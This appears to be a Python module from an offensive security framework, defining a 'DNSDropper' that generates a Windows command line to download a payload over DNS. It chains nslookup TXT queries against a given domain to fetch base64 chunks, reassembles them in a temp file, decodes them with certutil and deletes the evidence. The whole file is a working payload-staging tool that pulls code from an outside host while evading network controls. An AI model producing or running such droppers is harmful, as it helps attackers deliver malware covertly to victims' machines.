from lets.__module__ import Module
import os


class DNSDropper(Module):
    """
    Download a payload over DNS using nslookup and certutil.

    NOTE: Uses modified PowerDNS syntax, so text records
    should be base64 encoded, but not gzipped.
    """

    @classmethod
    def add_arguments(self, parser):
        parser.add_argument("domain", type=str,
            help="domain name")
        parser.add_argument("path", type=str,
            help="download location")
        parser.add_argument("-a", "--address", type=str,
            help="address of domain server")

    def handle(self, input, domain, path, address=None):
       
        # Temporary file
        fpath = os.path.extsep.join([path, "b64"])

        def lookup(n):
            s = "nslookup -type=TXT -retry=3 -timeout=6 %s.%s" % (n, domain)
            if address:
                s += " %s" % address
            return s

        cmd = " && ".join([

            # Get LENGTH from 0.DOMAIN
            'for /f "skip=4 usebackq tokens=1" %%a in (`"%s"`) do (%s)' % (lookup(0),

                # For I in 1..LENGTH
                'for /l %%b in (1,1,%%~a) do (%s)' % (

                    # Get DATA from I.DOMAIN
                    'for /f "skip=4 usebackq tokens=1" %%c in (`"%s"`) do (%s)' % (lookup("%b"),

                        # Append tempfile with DATA
                        'echo %%~c >> %s' % (fpath)
                    )
                )
            ),

            # Decode tempfile
            "certutil -f -decode %s %s" % (fpath, path),

            # Delete tempfile
            "del %s" % (fpath),
        ])

        yield cmd.encode()
